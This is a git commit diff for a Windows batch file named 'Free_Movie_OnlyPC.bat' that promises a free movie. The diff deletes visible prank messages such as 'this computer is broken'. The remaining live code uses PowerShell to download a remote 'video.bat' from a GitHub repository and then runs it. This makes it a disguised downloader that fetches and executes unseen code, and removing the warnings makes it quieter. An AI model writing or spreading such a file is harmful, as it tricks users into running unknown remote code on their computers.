5f55e43efaca60bdd8a4c55a9511c38af4f98c92
LKR-beta <gbu23224@gmail.com>
2024-09-24 14:56:55 +0900

    Free_Movie_OnlyPC.bat

--- Free_Movie_OnlyPC.bat
+++ Free_Movie_OnlyPC.bat
@@ -1,18 +1,6 @@
 @echo off 
 cls
 
-echo in %date%  %time%
-
-timeout /t 2 /nobreak > NUL
-
-echo this computer is broken
-
-timeout /t 2 /nobreak > NUL
-
-color 4
-
-echo by lkr(gihuy10
-
 powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/nope/raw/main/video.bat','C:\your\asylum\video.bat')"
 
 start video.bat
